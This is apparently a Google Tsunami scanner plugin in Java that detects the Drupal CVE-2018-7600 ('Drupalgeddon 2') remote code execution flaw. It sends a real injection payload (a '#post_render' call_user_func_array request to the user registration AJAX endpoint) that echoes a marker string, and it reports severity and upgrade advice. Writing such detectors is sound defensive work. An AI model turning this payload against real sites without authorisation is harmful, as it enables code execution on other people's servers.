/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve20187600;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects highly critical RCE vulnerability on Drupal platforms
 * (CVE-2018-7600).
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "DrupalCve20187600Detector",
    version = "0.1",
    description = "Detects CVE-2018-7600, RCE vulnerability in Drupal.",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = DrupalCve20187600DetectorBootstrapModule.class)
public final class DrupalCve20187600Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  public static final String SAMPLE_STRING = "scanning-CVE-2018-7600";
  public static final String RESPONSE_STRING = "BEGIN" + SAMPLE_STRING + "END";
  private static final ByteString PAYLOAD =
      ByteString.copyFromUtf8(
          "form_id=user_register_form&_drupal_ajax=1&mail[0]=BEGIN%1$sEND&mail[1]="
              + SAMPLE_STRING
              + "&mail[#children]=sprintf&mail[#post_render][]=call_user_func_array");
  private static final String PATH =
      "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  DrupalCve20187600Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting Drupalgeddon 2 RCE detection.");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  /** Checks if a {@link NetworkService} has a Drupalgeddon 2 vulnerability. */
  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + PATH;
    logger.atInfo().log("Trying to execute code at '%s'", targetUri);

    try {
      // This is a blocking call.
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type", "application/x-www-form-urlencoded")
                          .build())
                  .setRequestBody(PAYLOAD)
                  .build());

      return response.status().isSuccess()
          && response.bodyString().map(body -> body.contains(RESPONSE_STRING)).orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    TextData details =
        TextData.newBuilder()
            .setText("The Drupal platform is vulnerable to CVE-2018-7600.")
            .build();
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2018_7600"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Drupalgeddon 2 Detected")
                .setDescription(
                    "This version of Drupal is vulnerable to CVE-2018-7600. Drupal versions before"
                        + " 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 are"
                        + " vulnerable to this vulnerability. Drupal has insufficient input"
                        + " sanitation on Form API AJAX requests. This enables an attacker to"
                        + " inject a malicious payload into the internal form structure which would"
                        + " then be executed without any authentication")
                .setRecommendation("Upgrade to Drupal 8.3.9 or Drupal 8.5.1.")
                .addAdditionalDetails(AdditionalDetail.newBuilder().setTextData(details)))
        .build();
  }
}
